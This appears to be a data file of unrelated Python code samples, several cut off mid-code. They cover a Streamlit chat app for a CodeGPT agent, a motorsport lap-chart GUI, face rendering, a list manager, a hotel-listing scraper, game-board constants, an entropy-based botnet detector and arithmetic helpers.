    "import streamlit as st\nfrom judini.codegpt import CodeGPTPlus\nfrom dotenv import load_dotenv\nimport os\nimport time\nload_dotenv()\n\n\n# connect with codegpt\napi_key= os.getenv('CODEGPT_API_KEY')\nagent_id= os.getenv('CODEGPT_AGENT_ID')\norg_id= os.getenv('ORG_ID')\n\nst.set_page_config(layout=\"centered\")\n\nst.title(\"Agent FAQ\")\nst.markdown(\"---\")\n\n# init chat\nif \"messages\" not in st.session_state:\n    st.session_state.messages = []\n\n# Display chat\nfor message in st.session_state.messages:\n    with st.chat_message(message[\"role\"]):\n        st.markdown(message[\"content\"])\n\n# User input\nif prompt := st.chat_input(\"How can I help you?\"):\n    # user message history\n    st.session_state.messages.append({\"role\":\"user\", \"content\": prompt})\n\n    with st.chat_message(\"user\"):\n        st.markdown(prompt)\n\n    with st.chat_message(\"assistant\"):\n        with st.spinner(\"Thinking...\"):\n            message_placeholder = st.empty()\n            full_response = \"\"\n\n\n            # connect CodeGPT SDK\n            codegpt = CodeGPTPlus(api_key=api_key, org_id=org_id)\n            messages = st.session_state.messages\n\n            response_completion = codegpt.chat_completion(agent_id=agent_id, messages=messages, stream=True)\n\n            for response in response_completion:\n                time.sleep(0.05)\n                full_response += (response or \"\")\n                message_placeholder.markdown(full_response + \"|\")\n\n            message_placeholder.markdown(full_response)\n    \n    st.session_state.messages.append({\"role\":\"assistant\", \"content\": full_response})\n\n\n\n",
    "## TO-DO\n## Find an effective way to show cars with multiple drivers\n## Tidy up GUI\n## Include other types of graphs. See Issue #1\n## Animate the graph\n\nimport matplotlib.pyplot as plt\nimport requests\nimport tkinter as tk\nfrom tkinter import ttk, messagebox\n\nclass GUI:\n    def __init__(self):\n        self.root = tk.Tk()\n        self.root.title('Lap Chart Plotter')\n\n        self.root.geometry('300x300')\n        self.root.resizable(False, False)\n\n        resetButton = tk.Button(self.root, text='Reset', command=self.reset)\n        resetButton.place(x=175, y=240)\n        self.lapChartButton = tk.Button(self.root, text='Load Lap Chart', command=self.loadLapChart)\n        self.lapChartButton.place(x=75, y=240)\n        self.lapChartButton.configure(state='disabled')\n\n        self.chooseDecade()\n\n        tk.mainloop()\n    \n    def reset(self):\n            self.root.destroy()\n            GUI()\n    \n    def chooseDecade(self):\n        self.decadeVar = tk.StringVar(self.root)\n        self.decadeVar.set(\"\")\n\n        self.boxDecade = ttk.OptionMenu(self.root, self.decadeVar, \"Select a decade\", \"2020s\", \"2010s\", \"2000s\", \"1990s\", \"1980s\", \"1970s\", \"1960s\", \"1950s\", command=self.chooseSeries)\n        self.boxDecade.pack(pady=10)\n    \n    def chooseSeries(self, decade: str):\n        self.boxDecade.configure(state='disabled')\n\n        r = requests.get(f'https://motorsportstats.com/api/advanced-search?entity=series&size=999&filterIds={decade}')\n        data = r.json()\n        self.dictSeries = dict((i['name'], i['uuid']) for i in data['content'])\n\n\n        self.seriesVar = tk.StringVar(self.root)\n        self.seriesVar.set(\"\")\n\n        self.boxSeries = ttk.OptionMenu(self.root, self.seriesVar, \"Select a series\", *self.dictSeries.keys(), command=self.chooseYear)\n        self.boxSeries.pack(pady=10)\n\n    def chooseYear(self, series: str):\n        self.boxSeries.configure(state='disabled')\n        self.yearVar = tk.StringVar(self.root)\n        self.yearVar.set(\"\")\n\n        years = [int(str(self.decadeVar.get()[:3]) + str(i)) for i in range(0,10)]\n        self.boxYear = ttk.OptionMenu(self.root, self.yearVar, \"Select a year\", *years, command=self.chooseRace)\n        self.boxYear.pack(pady=10)\n    \n    def chooseRace(self, year):\n        self.boxYear.configure(state='disabled')\n\n        seriesUUID = self.dictSeries[self.seriesVar.get()]\n\n        r = requests.get(f'https://motorsportstats.com/api/advanced-search?entity=events&size=999&filterIds={seriesUUID}&filterIds={year}')\n        data = r.json()\n        if data['totalElements'] == 0:\n            messagebox.showerror(\"Error\", \"An error occured. The lap chart likely doesn't exist for this race\")\n            self.reset()\n\n        self.dictRace = dict((i['name'], i['uuid']) for i in data['content'])\n\n        self.raceVar = tk.StringVar()\n        self.raceVar.set(\"\")\n\n        self.boxRace = ttk.OptionMenu(self.root, self.raceVar, \"Select a race\", *self.dictRace.keys(), command=self.chooseSession)\n        self.boxRace.pack(pady=10)\n        \n    def chooseSession(self, race):\n        self.boxRace.configure(state='disabled')\n\n        sessionNames = ['race', 'race-1', 'race-2', 'race-3', 'race-4', 'race-5'] # the only way to find available sessions seems to be trial and error using possible session names. only races are available as quali/practice tends to have strange data that doesn't work on the graph\n        validSessions = []\n        for i in sessionNames:\n            try:\n                r = requests.get(f'https://motorsportstats.com/api/result-statistics?sessionSlug={self.dictRace[self.raceVar.get()]}_{i}&sessionFact=LapChart&size=999')\n                data = r.json()\n                validSessions.append(i)\n            except:\n                    pass\n\n        if validSessions == []:\n            messagebox.showerror(\"Error\", \"An error occured. The lap chart likely doesn't exist for this race\")\n            self.reset()\n\n        \n        self.sessionVar = tk.StringVar()\n        self.sessionVar.set(\"\")\n\n        boxSession = ttk.OptionMenu(self.root, self.sessionVar, \"Select a session\", *validSessions, command=self.enableButton)\n        boxSession.pack(pady=10)\n    \n    def enableButton(self, session): ##session value is ignored\n        self.lapChartButton.config(state='normal')\n    \n    def loadLapChart(self):\n        try:\n            plot(f'https://motorsportstats.com/api/result-statistics?sessionSlug={self.dictRace[self.raceVar.get()]}_{self.sessionVar.get()}&sessionFact=LapChart&size=999', self.raceVar.get(), self.yearVar.get(), self.sessionVar.get())\n        except:\n            messagebox.showerror(\"Error\", \"An error occured. The lap chart likely doesn't exist for this race\")\n\n\ndef plot(url, name, year, session):\n\n    def create_arr(num): #creates an array for a car from the array of laps\n        pos = []\n        for k, l in enumerate(data['content']):\n            for i, j in enumerate(data['content'][k]['cars']):\n                if j == str(num):\n                    pos.append",
    "import os\r\n\r\nimport cv2\r\nimport numpy as np\r\nimport torch\r\nfrom skimage.io import imsave\r\nfrom torchvision import transforms\r\n\r\nfrom external.FaceVerse import get_faceverse\r\nfrom external.FaceVerse.OpenSeeFace.tracker import Tracker\r\nfrom external.PIRender import FaceGenerator\r\nimport external.FaceVerse.losses as losses\r\nfrom external.FaceVerse.util_function import get_length, ply_from_array_color\r\n\r\n\r\ndef torch_img_to_np2(img):\r\n    img = img.detach().cpu().numpy()\r\n    # img = img * np.array([0.229, 0.224, 0.225]).reshape(1,-1,1,1)\r\n    # img = img + np.array([0.485, 0.456, 0.406]).reshape(1,-1,1,1)\r\n    img = img * np.array([0.5, 0.5, 0.5]).reshape(1, -1, 1, 1)\r\n    img = img + np.array([0.5, 0.5, 0.5]).reshape(1, -1, 1, 1)\r\n    img = img.transpose(0, 2, 3, 1)\r\n    img = img * 255.0\r\n    img = np.clip(img, 0, 255).astype(np.uint8)[:, :, :, [2, 1, 0]]\r\n\r\n    return img\r\n\r\n\r\ndef torch_img_to_np(img):\r\n    return img.detach().cpu().numpy().transpose(0, 2, 3, 1)\r\n\r\n\r\ndef _fix_image(image):\r\n    if image.max() < 30.0:\r\n        image = image * 255.0\r\n    image = np.clip(image, 0, 255).astype(np.uint8)[:, :, :, [2, 1, 0]]\r\n    return image\r\n\r\n\r\ndef obtain_seq_index(index, num_frames, semantic_radius=13):\r\n    seq = list(range(index - semantic_radius, index + semantic_radius + 1))\r\n    seq = [min(max(item, 0), num_frames - 1) for item in seq]\r\n    return seq\r\n\r\n\r\ndef transform_semantic(semantic):\r\n    semantic_list = []\r\n    for i in range(semantic.shape[0]):\r\n        index = obtain_seq_index(i, semantic.shape[0])\r\n        semantic_item = semantic[index, :].unsqueeze(0)\r\n        semantic_list.append(semantic_item)\r\n    semantic = torch.cat(semantic_list, dim=0)\r\n    return semantic.transpose(1, 2)\r\n\r\n\r\nclass IncrementalFrame:\r\n    def __init__(self) -> None:\r\n        self.frames = []\r\n        self.frame_names = []\r\n\r\n    def add(self, frame, name):\r\n        self.frames.append(frame)\r\n        self.frame_names.append(name)\r\n\r\n    def reset(self):\r\n        self.frames = []\r\n        self.frame_names = []\r\n\r\n    def length(self):\r\n        return len(self.frames)\r\n\r\n\r\nclass Render(object):\r\n    \"\"\"Computes and stores the average and current value\"\"\"\r\n\r\n    def __init__(self, device=\"cpu\"):\r\n        self.faceverse, _ = get_faceverse(device=device, img_size=224)\r\n        self.faceverse.init_coeff_tensors()\r\n        self.id_tensor = (\r\n            torch.from_numpy(np.load(\"external/FaceVerse/reference_full.npy\"))\r\n            .float()\r\n            .view(1, -1)[:, :150]\r\n        )\r\n        self.pi_render = FaceGenerator().to(device)\r\n        self.pi_render.eval()\r\n        checkpoint = torch.load(\"external/PIRender/cur_model_fold.pth\")\r\n        self.pi_render.load_state_dict(checkpoint[\"state_dict\"])\r\n\r\n        self.mean_face = (\r\n            torch.FloatTensor(\r\n                np.load(\"external/FaceVerse/mean_face.npy\").astype(np.float32)\r\n            )\r\n            .view(1, 1, -1)\r\n            .to(device)\r\n        )\r\n        self.std_face = (\r\n            torch.FloatTensor(\r\n                np.load(\"external/FaceVerse/std_face.npy\").astype(np.float32)\r\n            )\r\n            .view(1, 1, -1)\r\n            .to(device)\r\n        )\r\n\r\n        self._reverse_transform_3dmm = transforms.Lambda(lambda e: e + self.mean_face)\r\n\r\n        self.fake_video = IncrementalFrame()\r\n\r\n    def rendering(\r\n        self, path, ind, listener_vectors, speaker_video_clip, listener_reference\r\n    ):\r\n        # 3D video\r\n        T = listener_vectors.shape[0]\r\n        listener_vectors = self._reverse_transform_3dmm(listener_vectors)[0]\r\n\r\n        self.faceverse.batch_size = T\r\n        self.faceverse.init_coeff_tensors()\r\n\r\n        self.faceverse.exp_tensor = (\r\n            listener_vectors[:, :52].view(T, -1).to(listener_vectors.get_device())\r\n        )\r\n        self.faceverse.rot_tensor = (\r\n            listener_vectors[:, 52:55].view(T, -1).to(listener_vectors.get_device())\r\n        )\r\n        self.faceverse.trans_tensor = (\r\n            listener_vectors[:, 55:].view(T, -1).to(listener_vectors.get_device())\r\n        )\r\n        self.faceverse.id_tensor = (\r\n            self.id_tensor.view(1, 150)\r\n            .repeat(T, 1)\r\n            .view(T, 150)\r\n            .to(listener_vectors.get_device())\r\n        )\r\n\r\n        pred_dict = self.faceverse(\r\n            self.faceverse.get_packed_tensors(), render=True, texture=False\r\n        )\r\n        rendered_img_r = pred_dict[\"rendered_img\"]\r\n        rendered_img_r = np.clip(rendered_img_r.cpu().numpy(), 0, 255)\r\n        rendered_img_r = rendered_img_r[:, :, :, :3].astype(np.uint8)\r\n\r\n        # 2D video\r\n        # listener_vectors = torch.cat((listener_exp.view(T,-1), listener_trans.view(T, -1), listener_rot.view(T, -1)))\r\n        semantics = transform_semantic(listener_vectors.detach()).to(\r\n            listener_vectors.get_device()\r\n        )\r\n        C, H, W = listener_reference.shape\r\n        output_dict_list = []\r\n        duration = listener_vectors.shape[0] // 20\r\n        listener_reference_frames ",
    "import tkinter as tk\r\nfrom tkinter import filedialog, messagebox, simpledialog\r\n\r\nclass Application(tk.Tk):\r\n    def __init__(self):\r\n        super().__init__()\r\n        self.title(\"List Manager\")\r\n        self.geometry(\"500x500\")\r\n\r\n        self.create_menu()\r\n        self.create_widgets()\r\n\r\n    def create_menu(self):\r\n        menuBar = tk.Menu(self)\r\n        #File\r\n        file_menu = tk.Menu(menuBar, tearoff=0)\r\n        file_menu.add_command(label=\"Open\", command=self.open_file)\r\n        file_menu.add_command(label=\"Save\", command=self.save_file)\r\n        menuBar.add_cascade(label=\"File\", menu=file_menu)\r\n\r\n        #Edit\r\n        edit_menu = tk.Menu(menuBar, tearoff=0)\r\n        edit_menu.add_command(label=\"Add\", command=self.add_item)\r\n        edit_menu.add_command(label=\"Delete\", command=self.delete_item)\r\n        edit_menu.add_command(label=\"Edit\", command=self.edit_item)\r\n        menuBar.add_cascade(label=\"Edit\", menu=edit_menu)\r\n\r\n        #Help\r\n        Help_menu = tk.Menu(menuBar, tearoff=0)\r\n        Help_menu.add_command(label=\"About\", command=self.show_about)\r\n        menuBar.add_cascade(label=\"Help\", menu=Help_menu)\r\n\r\n        #Show Menu in Window\r\n        self.config(menu=menuBar)\r\n\r\n    #File Menu\r\n    def create_widgets(self):\r\n        #Frame\r\n        self.frame = tk.Frame(self)\r\n        self.frame.pack(fill=\"both\", expand=True)\r\n\r\n        self.listbox = tk.Listbox(self.frame)\r\n        self.listbox.pack(fill=\"both\", expand=True)\r\n\r\n    def open_file(self):\r\n        #Open File in File Manager\r\n        file_path = filedialog.askopenfilename(filetypes=[(\"Text files\", \"*.txt\")])\r\n\r\n        #Get File Content to ListBox\r\n        if file_path:\r\n            with open(file_path, \"r\") as file:\r\n                self.listbox.delete(0, tk.END)\r\n                for line in file:\r\n                    self.listbox.insert(tk.END, line.strip())\r\n    \r\n    def save_file(self):\r\n        #Save File Settings to File Manager\r\n        file_path = filedialog.asksaveasfilename(defaultextension=\".txt\", filetypes=[(\"Text files\", \"*.txt\")])\r\n\r\n        #Save File\r\n        if file_path:\r\n            with open(file_path, \"w\") as file:\r\n                for i in range(self.listbox.size()):\r\n                    file.write(self.listbox.get(i) + \"\\n\")\r\n\r\n    #Edit Menu\r\n    def add_item(self):\r\n        #DialogBox for Input\r\n        item = simpledialog.askstring(\"Add Item\", \"Enter Item:\")\r\n\r\n        #Add Item to the ListBox\r\n        if item:\r\n            self.listbox.insert(tk.END, item)\r\n    \r\n    def delete_item(self):\r\n        #Get the Selected Item\r\n        selected_item = self.listbox.curselection()\r\n\r\n        #Delete Selected Item\r\n        if selected_item:\r\n            for index in selected_item[::-1]:\r\n                self.listbox.delete(index)\r\n\r\n    def edit_item(self):\r\n        #Get the Selected Item\r\n        selected_item = self.listbox.curselection()\r\n\r\n        #Edit the Selected Item\r\n        if selected_item:\r\n            item = self.listbox.get(selected_item)\r\n            new_item = simpledialog.askstring(\"Edit Item\", \"Enter New Value:\", initialvalue=item)\r\n\r\n            #Edit the Selected Item with New Value\r\n            if new_item:\r\n                self.listbox.delete(selected_item)\r\n                self.listbox.insert(selected_item, new_item)\r\n\r\n    #Help Menu\r\n    def show_about(self):\r\n        messagebox.showinfo(\"About\", \"List Manager\\nVersion 1.0\\nAuthor: Villaber, Christian Jude\")\r\n\r\n\r\n\r\n\r\napp = Application()\r\napp.mainloop()\r\n",
    "#! pip install pandas undetected_chromedriver bs4 selenium\nfrom selenium.webdriver.support.ui import WebDriverWait\nimport undetected_chromedriver as uc\nfrom bs4 import BeautifulSoup\nimport re\nimport pandas as pd\nimport time\n\nwait_time = 1000\ntimeout = 3000\ntotal_iterations = 20\n# actual url to be scaped\nurl = \"https://www.trip.com/hotels/list?city=220&cityName=Dubai&provinceId=0&countryId=0&districtId=0&checkin=2024%2F04%2F03&checkout=2024%2F04%2F11&crn=1&adult=2&children=0&searchBoxArg=t&travelPurpose=0&ctm_ref=ix_sb_dl&domestic=true&listFilters=17%7C1*17*1*2%2C80%7C0%7C1*80*0*2%2C29%7C1*29*1%7C2*2&locale=en-XX&curr=USD\"\n\nhotel_details = {}\ncity_id = re.split(\"=|&\", url)[1]\ndef scrape_quotes(url):\n    driver = uc.Chrome()\n    driver.get(url)\n    WebDriverWait(driver, timeout, wait_time)\n    initial_html = driver.page_source\n    initial_soup = BeautifulSoup(initial_html, \"html.parser\")\n    initial_quotes = initial_soup.find_all(\"div\", class_=\"compressmeta-hotel-wrap-v8\")\n    extract_and_print_quotes(initial_quotes)\n    for _ in range(total_iterations):\n        driver.execute_script(\n            \"window.scrollTo(0, document.body.scrollHeight);\")\n        driver.implicitly_wait(10)\n        time.sleep(10)\n        WebDriverWait(driver, timeout, wait_time)\n        scroll_html = driver.page_source\n        scroll_soup = BeautifulSoup(scroll_html, \"html.parser\")\n        scroll_quotes = scroll_soup.find_all(\"div\", class_=\"compressmeta-hotel-wrap-v8\")\n        extract_and_print_quotes(scroll_quotes)\n    driver.quit()\n\n\ndef extract_and_print_quotes(quotes):\n    for quote in quotes:\n        quote = BeautifulSoup(str(quote), \"html.parser\")\n        hotel_id = quote.find(\"div\", class_=\"compressmeta-hotel-wrap-v8\")[\"id\"]\n        hotel_name = quote.find(\"span\", class_=\"name\").text\n        hotel_details[hotel_name] = (\n            f\"https://www.trip.com/hotels/detail/?cityId={city_id}&hotelId={hotel_id}\"\n        )\n        print(f\"Hotel ID: {hotel_id}\")\n        print(f\"Hotel Name: {hotel_name}\")\n        print(f\"{len(hotel_details)=}\")\n        print(\"----------\")\n\n\nif __name__ == \"__main__\":\n    scrape_quotes(url)\n    print(hotel_details)\n    import pandas as pd\n    pd.DataFrame.from_dict(hotel_details, orient=\"index\").to_csv(\"123.csv\")\n",
    "\"\"\"Parameters to determine the board state\"\"\"\n\nLEVERS = {\n    0: {'x': 40, 'y': 147},\n    1: {'x': 92, 'y': 147},\n    2: {'x': 144, 'y': 147},\n    3: {'x': 196, 'y': 147},\n\n    4: {'x': 14, 'y': 235},\n    5: {'x': 66, 'y': 235},\n    6: {'x': 118, 'y': 235},\n    7: {'x': 170, 'y': 235},\n    8: {'x': 222, 'y': 235},\n\n    9: {'x': -12, 'y': 323},\n    10: {'x': 40, 'y': 323},\n    11: {'x': 92, 'y': 323},\n    12: {'x': 144, 'y': 323},\n    13: {'x': 196, 'y': 323},\n    14: {'x': 248, 'y': 323},\n\n    15: {'x': -38, 'y': 411},\n    16: {'x': 14, 'y': 411},\n    17: {'x': 66, 'y': 411},\n    18: {'x': 118, 'y': 411},\n    19: {'x': 170, 'y': 411},\n    20: {'x': 222, 'y': 411},\n    21: {'x': 274, 'y': 411},\n\n    22: {'x': -64, 'y': 499},\n    23: {'x': -12, 'y': 499},\n    24: {'x': 40, 'y': 499},\n    25: {'x': 92, 'y': 499},\n    26: {'x': 144, 'y': 499},\n    27: {'x': 196, 'y': 499},\n    28: {'x': 248, 'y': 499},\n    29: {'x': 300, 'y': 499},\n}\n\nPAD_DELTA_BOTTOM = {\n    'x': 13,\n    'y': 15,\n}\n\nPAD_DELTA = {\n    'x': -13,\n    'y': -16,\n}\n\nCOIN_DELTA = {\n    'x': 0,\n    'y': -15,\n}\n\nPAD_RIGHT_DELTA = abs(PAD_DELTA['x']) * 2\n\n\n\"\"\"Parameters to determine the game state\"\"\"\n\n# delta between the winapi location (top-left of window) and the original board location used to compute the board state\nLOC_OFFSET = {\n    'x': 115,\n    'y': 37,\n}\n\n# Top right location of the 202x15 sliver of the board used to detect coin drops\nCOIN_DROP = {\n    'x': 16 + 11, # start at the middle of the slot -- subsequent middels are spaced 26 pixels\n    'y': 65,\n}\n\n# Sum of the pixel values of the 1x15 sliver in the middle of the slot\n# ,slot 2: ,slot 3: ,slot 4: ,slot 5: ,slot 6: ,slot 7: \n# SLOT_BACKGROUND_SUM = {\n#     0: 143.4,\n#     1: 144.475,\n#     2: 143.8,\n#     3: 144.55,\n#     4: 144.7,\n#     5: 144.875,\n#     6: 145.375,\n#     7: 142.25,\n# }\nSLOT_BACKGROUND_SUM = {\n    0: 144.62,\n    1: 145.72,\n    2: 145.1,\n    3: 146.2,\n    4: 145.98,\n    5: 146.94,\n    6: 147.22,\n    7: 144.32,\n}\n\nLOC_ROUND = {\n    'x': 134,\n    'y': 30,\n}\n\nLOC_ROUND_SCORE = {\n    'left': {\n        1: {'x': -73, 'y': 74},\n        2: {'x': -73, 'y': 91},\n        3: {'x': -73, 'y': 108},\n        4: {'x': -73, 'y': 125},\n    },\n    'right': {\n        1: {'x': 273, 'y': 74},\n        2: {'x': 273, 'y': 91},\n        3: {'x': 273, 'y': 108},\n        4: {'x': 273, 'y': 125},\n    }\n}",
    "import tqdm\r\nimport pandas as pd\r\nimport argparse\r\nimport os.path\r\nimport sys\r\n\r\nfrom functions import *\r\n\r\nif __name__ == \"__main__\":\r\n    parser = argparse.ArgumentParser(description=\"D\u00e9tection d'utilisateurs malveillants dans un r\u00e9seau.\")\r\n    parser.add_argument(\"-d\", \"--csv_file\", help=\"Chemin vers le fichier CSV des flux r\u00e9seaus\", required=True)\r\n    parser.add_argument(\"--udp\", action='store_true', help=\"Argument pour inclure les paquets UDP dans l'analyse\")\r\n    parser.add_argument(\"-t\", \"--deltaT\", type=int, help=\"Valeur enti\u00e8re pour la dur\u00e9e d'une fenetre de calcul\", default=25)\r\n    parser.add_argument(\"-o\", \"--output\", help=\"Fichier de sortie des calculs\", default=\"x\")\r\n\r\n\r\n    args = parser.parse_args()\r\n    \r\n    if not os.path.exists(args.csv_file):\r\n        print(f\"Erreur : Le fichier CSV '{args.csv_file}' n'existe pas.\")\r\n        sys.exit(1)\r\n    \r\n    if args.deltaT <0:\r\n        print(\"Erreur : La valeur de l'argument -t doit \u00eatre positive.\")\r\n        sys.exit(1)\r\n    \r\n    if args.udp:\r\n        udp = True\r\n        print(f\"Inclusion des paquets UDP, le programme pourrait prendre plus de temps...\")\r\n    else:\r\n        udp = False\r\n    \r\n    print_separator()\r\n    print(\"|{:^62}|{:^12}|\".format(\"T\u00e2ches\", \"Statut\"))\r\n    print_separator()\r\n    \r\n    df = pd.read_csv(args.csv_file,delimiter=',')\r\n    \r\n    if not udp:\r\n        df = df.query(\"Proto == 'tcp'\")\r\n    \r\n    nb_agregation_par_fenetre = 5\r\n    t_fenetre = args.deltaT\r\n    print_table_row(\"Chargement du fichier fourni\", \"OK\")\r\n    \r\n    dt =  int(t_fenetre/nb_agregation_par_fenetre)\r\n    column_Label= False\r\n    df['StartTime'] = pd.to_datetime(df['StartTime'])\r\n    df['EndTime'] = df['StartTime'] + pd.to_timedelta(df['Dur'], unit='s')\r\n    print_table_row(\"Pr\u00e9traitement des donn\u00e9es\", \"OK\")\r\n\t\r\n    if \"Label\" in df.columns :\r\n        column_Label = True\r\n        df[\"target\"] = df['Label'].str.contains(\"Botnet\").astype(int)\r\n        \r\n        targets_srcIP =  df.groupby(\"SrcAddr\")[\"target\"].unique()\r\n        targets_srcIP = {ip:val[0] for  ip,val in targets_srcIP.items()}\r\n        predictions_majeur_srcIP = {ip:0 for  ip in targets_srcIP.keys()}\r\n        predictions_mineur_srcIP = {ip:0 for  ip in targets_srcIP.keys()}\r\n        \r\n        targets_dstIP =  df.groupby(\"DstAddr\")[\"target\"].unique()\r\n        targets_dstIP = {ip:val[0] for  ip,val in targets_dstIP.items()}\r\n        predictions_majeur_dstIP = {ip:0 for  ip in targets_dstIP.keys()}\r\n        predictions_mineur_dstIP = {ip:0 for  ip in targets_dstIP.keys()}\r\n    else:\r\n        predictions_srcIP = {ip:0 for ip in df[\"SrcAddr\"].unique()}\r\n        \r\n        predictions_dstIP = {ip:0 for ip in df[\"DstAddr\"].unique()}\r\n    \r\n\r\n    ## d\u00e9coupage des flux en morceaux de 5min par fenetre de calcul\r\n    fenetre_donnees = segmentation_of_dataFrame(df,dt)   \r\n    print_table_row(\"D\u00e9coupage par fen\u00eatre de temps de calcul\", \"OK\")\r\n\r\n    if len(fenetre_donnees)<nb_agregation_par_fenetre:\r\n       print(\"Le temps total d'enregistrement de vos donn\u00e9es est insuffisant.\\nVous avez deux solutions:\\n\\t\"+\r\n\t\t\t \"1- Fournir un enregistrement d'au moins 25 minutes.\\n\\t2- Configurer le programme pour travailler sur une fen\u00eatre de temps r\u00e9duite \"+\r\n\t\t\t \"(utilisez l'option -t n si votre enregistrement dure au moins n minutes).\")\r\n\r\n    else:\r\n        print_table_row(f\"Il y a {len(fenetre_donnees)-nb_agregation_par_fenetre+1} fenetre(s) de temps de calcul de {t_fenetre}min chacune\", \"\")\r\n        oldResult = {'srcIP' : {}, 'dstIP' : {}}\r\n\r\n        print_table_row(\"D\u00e9but de la pr\u00e9diction\", \"En cours\")\r\n        print_separator()\r\n        \r\n        for t in tqdm.tqdm(range(nb_agregation_par_fenetre,len(fenetre_donnees)+1)):\r\n            data_matrice_src,liste_ip_src = matrice_des_entropie(fenetre_donnees,t,oldResult, nb_agregation_par_fenetre, mode=\"srcIP\")\r\n            data_matrice_dst,liste_ip_dst = matrice_des_entropie(fenetre_donnees,t,oldResult, nb_agregation_par_fenetre, mode=\"dstIP\")\r\n            \r\n            seuil_anomalie_majeur_src = 2\r\n            seuil_anomalie_mineur_src = 415\r\n            seuil_anomalie_majeur_dst = 0.5\r\n            seuil_anomalie_mineur_dst = 200\r\n            \r\n            les_bots_majeur_src,les_bots_mineur_src = predire(data_matrice_src,liste_ip_src,seuil_anomalie_majeur_src,seuil_anomalie_mineur_src)\r\n            les_bots_majeur_dst,les_bots_mineur_dst = predire(data_matrice_dst,liste_ip_dst,seuil_anomalie_majeur_dst,seuil_anomalie_mineur_dst)\r\n            for ip in les_bots_majeur_src:\r\n                predictions_majeur_srcIP[ip] = 1\r\n            for ip in les_bots_mineur_src:\r\n                predictions_mineur_srcIP[ip] = 1\r\n            for ip in les_bots_majeur_dst:\r\n                predictions_majeur_dstIP[ip] = 1\r\n            for ip in les_bots_mineur_dst:\r\n                predictions_mineur_dstIP[ip] = 1\r\n        print_separator()\r\n        print_table_row(\"Pr\u00e9dictions\",\"OK\")\r\n        # On affiche les scores de notre algorithme ou on enregistre les pr\u00e9dictions en foncti",
    "# =============================================================================================================================\n# ARITHMETICS =================================================================================================================\n# =============================================================================================================================\n\n# addition #\n\n# Sum of two integer or float arguments\nlmfn_add_2_args = lambda arg1, arg2 : arg1 + arg2\n\n# Sum of three integer or float arguments\nlmfn_add_3_args = lambda arg1, arg2, arg3 : arg1 + arg2 + arg3\n\n# Sum of four integer or float arguments\nlmfn_add_4_args = lambda arg1, arg2, arg3, arg4 : arg1 + arg2 + arg3 + arg4\n\n# Sum of five integer or float arguments\nlmfn_add_5_args = lambda arg1, arg2, arg3, arg4, arg5 : arg1 + arg2 + arg3 + arg4 + arg5\n\n# Sum of six integer or float arguments\nlmfn_add_6_args = lambda arg1, arg2, arg3, arg4, arg5, arg6 : arg1 + arg2 + arg3 + arg4 + arg5 + arg6\n\n# Sum of seven integer or float arguments\nlmfn_add_7_args = lambda arg1, arg2, arg3, arg4, arg5, arg6, arg7 : arg1 + arg2 + arg3 + arg4 + arg5 + arg6 + arg7\n\n# Sum of eight integer or float arguments\nlmfn_add_8_args = lambda arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8 : arg1 + arg2 + arg3 + arg4 + arg5 + arg6 + arg7 + arg8\n\n# Integer sum of two integer arguments\ndef add_2_int_args(arg1:int,\n                   arg2:int)->int:\n    return (int(arg1) +\n            int(arg2))\n\n# Integer sum of three integer arguments\ndef add_3_int_args(arg1:int,\n                   arg2:int,\n                   arg3:int)->int:\n    return (int(arg1) +\n            int(arg2) +\n            int(arg3))\n\n# Integer sum of four integer arguments\ndef add_4_int_args(arg1:int,\n                   arg2:int,\n                   arg3:int,\n                   arg4:int)->int:\n    return (int(arg1) +\n            int(arg2) +\n            int(arg3) +\n            int(arg4))\n\n# Integer sum of five integer arguments\ndef add_5_int_args(arg1:int,\n                   arg2:int,\n                   arg3:int,\n                   arg4:int,\n                   arg5:int)->int:\n    return (int(arg1) +\n            int(arg2) +\n            int(arg3) +\n            int(arg4) +\n            int(arg5))\n\n# Integer sum of six integer arguments\ndef add_6_int_args(arg1:int,\n                   arg2:int,\n                   arg3:int,\n                   arg4:int,\n                   arg5:int,\n                   arg6:int)->int:\n    return (int(arg1) +\n            int(arg2) +\n            int(arg3) +\n            int(arg4) +\n            int(arg5) +\n            int(arg6))\n\n# Integer sum of seven integer arguments\ndef add_7_int_args(arg1:int,\n                   arg2:int,\n                   arg3:int,\n                   arg4:int,\n                   arg5:int,\n                   arg6:int,\n                   arg7:int)->int:\n    return (int(arg1) +\n            int(arg2) +\n            int(arg3) +\n            int(arg4) +\n            int(arg5) +\n            int(arg6) +\n            int(arg7))\n\n# Integer sum of eight integer arguments\ndef add_8_int_args(arg1:int,\n                   arg2:int,\n                   arg3:int,\n                   arg4:int,\n                   arg5:int,\n                   arg6:int,\n                   arg7:int,\n                   arg8:int)->int:\n    return (int(arg1) +\n            int(arg2) +\n            int(arg3) +\n            int(arg4) +\n            int(arg5) +\n            int(arg6) +\n            int(arg7) +\n            int(arg8))\n\n# .................................\n\n# subtraction #\n\nlmfn_subt_2_args = lambda arg1, arg2 : arg1 - arg2\nlmfn_subt_3_args = lambda arg1, arg2, arg3 : arg1 - arg2 - arg3\nlmfn_subt_4_args = lambda arg1, arg2, arg3, arg4 : arg1 - arg2 - arg3 - arg4\nlmfn_subt_5_args = lambda arg1, arg2, arg3, arg4, arg5 : arg1 - arg2 - arg3 - arg4 - arg5\nlmfn_subt_6_args = lambda arg1, arg2, arg3, arg4, arg5, arg6 : arg1 - arg2 - arg3 - arg4 - arg5 - arg6\nlmfn_subt_7_args = lambda arg1, arg2, arg3, arg4, arg5, arg6, arg7 : arg1 - arg2 - arg3 - arg4 - arg5 - arg6 - arg7\nlmfn_subt_8_args = lambda arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8 : arg1 - arg2 - arg3 - arg4 - arg5 - arg6 - arg7 - arg8\n\n\n# multiplication #\n\nlmfn_mult_2_args = lambda arg1, arg2 : arg1 * arg2\nlmfn_mult_3_args = lambda arg1, arg2, arg3 : arg1 * arg2 * arg3\nlmfn_mult_4_args = lambda arg1, arg2, arg3, arg4 : arg1 * arg2 * arg3 * arg4\nlmfn_mult_5_args = lambda arg1, arg2, arg3, arg4, arg5 : arg1 * arg2 * arg3 * arg4 * arg5\nlmfn_mult_6_args = lambda arg1, arg2, arg3, arg4, arg5, arg6 : arg1 * arg2 * arg3 * arg4 * arg5 * arg6\nlmfn_mult_7_args = lambda arg1, arg2, arg3, arg4, arg5, arg6, arg7 : arg1 * arg2 * arg3 * arg4 * arg5 * arg6 * arg7\nlmfn_mult_8_args = lambda arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8 : arg1 * arg2 * arg3 * arg4 * arg5 * arg6 * arg7 * arg8\n\n\n# division 